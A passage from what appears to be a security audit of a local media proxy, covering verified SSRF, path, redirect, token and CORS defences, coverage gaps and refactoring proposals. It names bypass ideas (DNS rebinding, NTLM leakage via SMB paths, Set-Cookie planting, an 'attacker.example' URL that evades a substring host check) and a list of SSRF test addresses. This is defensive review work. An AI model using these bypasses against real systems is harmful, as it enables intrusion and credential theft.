2. **The extension allow-list is applied to the *normalised* path, and containment is enforced on the *realpath* of both the candidate and the root** (`core/proxy.py:197-203`, `:170-180`). The order is: normalise → unquote → extension check → `realpath` → `commonpath` containment → `isfile`. `os.path.commonpath` can only return a **prefix of the shorter** path, so it can never over-match; its case-sensitive component comparison (verified in `ntpath.commonpath`'s source) is safe because *both* sides are `realpath`-canonicalised to on-disk case.
3. **`_referenced_by_library` is not a TOCTOU escape.** The path is fixed before the DB check, the DB stores the literal path, and the file actually opened is the already-`realpath`'d candidate — a symlink swapped in after the check cannot redirect the open. The `LOWER(file_path)=LOWER(?)` lookup uses the covering index `idx_tracks_file_path` (query plan: `SCAN tracks USING COVERING INDEX idx_tracks_file_path`) and measured **0.01 ms** on 5 000 rows — no performance defect.
4. **SSRF literal coverage is solid.** Blocked and verified: `127.0.0.1`, `169.254.169.254`, `[::1]`, `localhost`, `0.0.0.0`, `2130706433` (decimal), `[::ffff:127.0.0.1]`, `10.0.0.5`, `192.168.1.1`, `172.16.0.1`. The guard is applied to the client-supplied `?url=` (`core/proxy.py:954`) **and** to the resolver-returned URL (`core/proxy.py:841`) **and** to the self-healed re-resolved URL (`core/proxy.py:1054`).
5. **The redirect chain is validated hop-by-hop.** `SafeRedirectHandler.redirect_request` (`core/proxy.py:375-387`) checks every `Location` with `_is_ssrf_safe_url` and caps the chain at 5 hops. CPython resolves the `Location` against the previous URL (`urljoin`) *before* `redirect_request` is called, so relative redirects are validated as absolute URLs. `build_opener` correctly removes the default `HTTPRedirectHandler` when a subclass instance is supplied, so no unvalidated redirect path exists.
6. **Credential scoping is correctly implemented.** `_host_matches` / `_host_allows_credentials` use `host == sfx or host.endswith('.' + sfx)`, so `evil-yandex.com`, `yandex.com.evil.com` and `notyoutube.com` do **not** match. `SafeRedirectHandler` strips `Authorization`/`Cookie` when a redirect crosses to a host the source does not own (`core/proxy.py:382-386`).
7. **Bearer token hygiene is good.** `secrets.token_urlsafe(24)` = 192 bits of entropy, regenerated on every `start()` (`core/proxy.py:1275`); compared with `hmac.compare_digest` (constant time, `core/proxy.py:511`); required on `GET` and `HEAD`; **fails closed** when no token is configured (`core/proxy.py:503-506`); and the request log redacts it — verified live: `'"GET /api/cover?path=abc&k=***&x=1 HTTP/1.1" 403 -'`. The token is never forwarded upstream, never stored in the database, and never appears in a `Referer` (the proxy forwards no `Referer`).
8. **No CRLF / response-splitting vector.** `BaseHTTPRequestHandler.send_header` performs **no** CRLF sanitisation (verified in the 3.14.7 source) — but no attacker-controlled value can contain CR/LF: `http.client`/`email` normalise both request and response header values, and the only reflected attacker value (the `Origin` header) is restricted to loopback origins.
9. **CORS reflection is correctly scoped.** Only `http(s)://127.0.0.1[:port]`, `localhost[:port]` and `[::1][:port]` are echoed (verified: `http://127.0.0.1.evil.com` and `http://evil.com` are **not** reflected). `Access-Control-Allow-Credentials` is never sent, so credentialed cross-origin reads stay blocked. (The check is a parse-level test, so `http://127.0.0.1:9999.evil.com` is echoed verbatim — harmless, since such an origin is not browser-valid and still denotes the user's own loopback.)
10. **No whole-file buffering.** Upstream bodies are streamed in 32 KB chunks (`core/proxy.py:1197`, `:1231`); local files use `shutil.copyfileobj` (64 KB) or an 8 KB chunk loop (`core/proxy.py:562-588`); the HLS playlist read is capped at 2 MiB (`core/proxy.py:1132-1134`).
11. **Per-request DB connection hygiene.** `finish()` releases the request thread's SQLite handle (`core/proxy.py:469-486`); the connection is opened lazily and thread-locally (`core/database.py:179-205`) — measured 0.93 ms per open including the six PRAGMAs.
12. **Shutdown closes the listening socket.** `LocalProxyManager.stop()` calls `shutdown()` then `server_close()`; `super().server_close()` runs before the `AttributeError` of F-WN-11-4, so the port is released and `self.port` is reset to 0. `core/app.py:551-552` stops the proxy **before** `db.close()`, so an in-flight request does not hit a closed database.

---

### 4. Coverage gaps

- **The app was never run** (per the ground rules). All measurements come from the project's own venv (CPython 3.14.7) against the real `core/proxy.py` / `core/api.py` modules and a live `ThreadingHTTPServer` bound to 127.0.0.1. No `~/.nedotify/` content was read or written.
- **The DNS-rebinding exploit (F-WN-11-5) was not demonstrated end-to-end** — it needs an attacker-controlled authoritative DNS server and a path to make the app proxy an arbitrary host. What *is* confirmed is the code path (resolve → cache → unchecked second resolve) and the memo behaviour (51 checks → 1 `getaddrinfo`). Evidence still missing: a live rebind against a real domain.
- **The NTLM half of F-WN-11-2 was not captured.** The 22.46 s blocking network stall was measured; the NTLM challenge/response exchange needs a live SMB server, which I did not stand up (and would have required a network listener). The SMB-connection primitive itself is confirmed by `os.path.realpath`'s use of `GetFinalPathNameByHandle`.
- **The proxy origin vs. the app origin** was confirmed from `webview/http.py:98-106` and `main.py:339` (the UI is served from pywebview's own Bottle server on `http://127.0.0.1:<random port>`), but I did not capture a live browser's cookie jar to demonstrate the `Set-Cookie` planting end-to-end (F-WN-11-6) — only the header propagation, which was captured.
- **Whether pywebview re-injects `window.pywebview` after a cross-origin navigation** (which would turn the F-WN-11-6 content-type issue into a bridge compromise) was **not** verified — that belongs to WN-03/WN-04, not to this area.
- **Live CDN behaviour was not exercised** (the `network` marker is deselected): the `_bound_googlevideo_range` 1 MiB cap, the HLS playlist rewrite against a real `.m3u8`, and the upstream `Range`/throttling interaction are analysed from the code only.
- **The WAN cost of the missing connection reuse (F-WN-11-3) is an extrapolation**; only the local components were measured (opener build 6.277 ms, `socket.create_connection` 0.096 ms on loopback, `HTTPSHandler()` 4.789 ms).
- **`core/resolver.py` was grepped, not read in full** — the proxy reaches it only through `AppCore.re_resolve_stream_url_async`, whose result is SSRF-validated at `core/proxy.py:1054`; the resolver's internals are WN-15's.
- **`core/database.py` was read selectively** (thread-local connection model, `tracks` schema/indexes, `stream_cache` accessors) — the rest of the persistence layer is WN-12's.
- **The legacy `ui/MACos_ui` pack and the Android subtree were not opened** (out of scope).

---

### 5. Architecture improvements (ARCH)

*No proven defect — improvement proposals only. These are reported separately from the defect list above.*

**ARCH-1 — One 1 334-line module carries seven unrelated responsibilities.**
`core/proxy.py` contains: bearer authentication, HTTP routing, path-safety policy, SSRF policy, provider-credential injection, HLS rewriting, on-disk stream caching, and upstream self-healing. The natural seams are already visible in the file: the path/SSRF helpers (L55–365) and `SafeRedirectHandler` (L368) are policy modules with no HTTP-state coupling, while `StreamProxyHandler.do_GET` (L694–1256, **563 lines**) mixes three request shapes (`/`, `/api/stream`, local-file serving) with six different failure exits. Extracting a `ProxyPolicy` (path safety + SSRF + credential scope) and a `StreamCache` (temp file → `os.replace` → `set_cached_file`) would make the security gates unit-testable without a socket, and would let the router compose *auth → SSRF → local-file* gates uniformly instead of re-implementing them per branch.

**ARCH-2 — Layering inversion: the transport layer imports the GUI-bridge layer for one helper.**
```python
# core/proxy.py:23-24
from core.api import _is_ssrf_safe_url  # mirrors core/api.py:_is_ssrf_safe_url; imported (not copied) —
                                        # core.api does not import core.proxy, so no import cycle
_is_safe_url = _is_ssrf_safe_url
```
`core/api.py` is the ~4 200-line pywebview bridge and imports `webview` (`core/api.py:21`). The proxy — a low-level transport — therefore depends on the highest-level module in the tree, and `core/proxy.py` cannot be imported or unit-tested without the GUI stack. The comment shows the author knew the dependency direction was wrong and chose "import it" over "copy it". The correct home already exists: `utils/url_safety.is_safe_media_url` — fail-closed, no cache, no GUI dependency — used by `audio/engine.py:12`, `core/downloader.py:16` and `core/download_transfer.py:9`, but **not** by the proxy.
**Consequence (already realised):** two SSRF policies coexist — `core/api.py`'s fails **open** on DNS failure and memoises verdicts for 120 s; `utils/url_safety.py`'s fails **closed** and does not cache. The same URL gets opposite verdicts depending on which module asks (F-WN-11-9, F-WN-11-5). One policy module, used by every egress point, would remove the divergence and the layering inversion in one move.

**ARCH-3 — `LocalProxyManager` is a thin facade, but it is not the policy owner.**
The class owns `start`/`stop`/`token`/`port` (`core/proxy.py:1259-1298`) and offers `auth_query()` / `get_proxy_url()`. But the bearer **policy** lives in `StreamProxyHandler._authorized` (`core/proxy.py:491-511`) and the URL **shape** is re-implemented by hand in `audio/engine.py:97-117`:
```python
# audio/engine.py:95
if not any(d in fp for d in ("youtube.com", "youtu.be", "soundcloud.com", "music.yandex.ru")):
```
That is a **substring** test over the whole URL, whereas the proxy's own `_host_matches` (`core/proxy.py:55-57`) is a proper **suffix** test. So `https://attacker.example/?ref=youtube.com` takes the "direct stream" branch and is routed through `/?url=…` instead of `/api/stream?track_id=…`, skipping the resolver/DB path and the stream-cache lookup. (Owner of `audio/engine.py`: **WN-17**.) Letting `LocalProxyManager` be the single producer of proxy URLs would remove the duplicated string-building and the divergent host heuristic.

**ARCH-4 — Per-request resource churn.**
Every proxy request thread opens a new SQLite connection (six PRAGMAs — measured 0.933 ms) and closes it in `finish()`; 120 HLS segments per track ⇒ ~112 ms and 120 connection churns through `DatabaseManager._all_conns` under `_conns_lock`. The per-request release is deliberate and documented (`core/proxy.py:469-476`), so the trade-off is intentional — but a small pooled/reused handle would remove it without changing the semantics.

**ARCH-5 — Roots and the offline flag are recomputed per chunk / per request.**
`_cover_roots()` rebuilds the root list and does an `os.path.isdir` on every request, and `_is_inside_roots` calls `os.path.realpath()` on each root on every request (4 `realpath` + 1 `isdir` per cover request, measured 0.064 ms). Separately, `is_offline()` is re-evaluated **for every 32 KB chunk** of the upstream stream (`core/proxy.py:1195`, `:1229`), and each call takes the global `SettingsManager` RLock (`core/settings.py:368`). The roots are fixed for the process lifetime and the offline flag needs to be read once per response — caching both would remove the churn and the lock traffic on the hot path.

**ARCH-6 — The redirect counter is modelled as handler state, which blocks opener reuse.**
`SafeRedirectHandler.redirect_count` (`core/proxy.py:372`, `:376`) is per-handler-instance, which is why the opener cannot be cached today (F-WN-11-3). CPython already maintains a per-request `req.redirect_dict` for loop detection; moving the hop counter there (or onto the `Request`) would decouple the policy from the transport and make the opener reusable.

**ARCH-7 — Response emission is duplicated across success and failure paths.**
`_send_cors_headers()` is called on some responses and not others (F-WN-11-10), and `send_error` / `send_response` are used interchangeably in ~12 places. A single `_respond(status, headers, body)` helper would make the CORS and content-type policy uniform by construction rather than by remembering to call it.
